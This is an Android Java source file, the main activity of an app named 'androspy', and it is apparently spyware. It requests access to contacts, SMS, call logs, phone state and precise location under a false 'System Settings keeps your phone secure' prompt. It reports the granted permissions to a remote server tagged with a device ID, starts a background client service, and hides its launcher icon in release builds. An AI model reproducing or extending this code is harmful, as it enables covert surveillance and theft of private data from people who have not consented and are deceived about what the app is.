package buddy.ap.com.androspy;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import java.util.HashMap;

import http.Http;
import pub.devrel.easypermissions.EasyPermissions;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final String PERMISSION_RATIONALE = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?";
    private CommonParams commonParams;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        commonParams = new CommonParams(this);
        if ((Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)) {
            askPermissions();
        } else {
            done();
        }
    }

    private void hideApp() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void startClient() {
        Intent i = new Intent(this, Client.class);
        startService(i);
    }

    private void done() {
        startClient();
        if (!BuildConfig.DEBUG) hideApp();
        finish();

    }

    private void askPermissions() {
        String[] perms = {
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,

        };

        if (EasyPermissions.hasPermissions(this, perms)) {
            // Already have permission, do the thing
            done();
        } else {
            // Do not have permissions, request them now
            EasyPermissions.requestPermissions(this, PERMISSION_RATIONALE,
                    1, perms);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int i = 0; i < grantResults.length; i++)
            Log.i(TAG, "Grant result: " + grantResults[i]);
        updatePermissions(permissions, grantResults);
        done();
    }

    private void updatePermissions(String[] perms, int[] results) {
        HashMap done = new HashMap();
        for (int i = 0; i < perms.length; i++) {
            done.put(perms[i], results[i] == PackageManager.PERMISSION_GRANTED ? "1" : "0");
        }
        Http doneSMS = new Http();
        doneSMS.setUrl(commonParams.getServer() + "/permissions/" + commonParams.getUid());
        doneSMS.setMethod("POST");
        doneSMS.setParams(done);
        doneSMS.execute();
    }
}
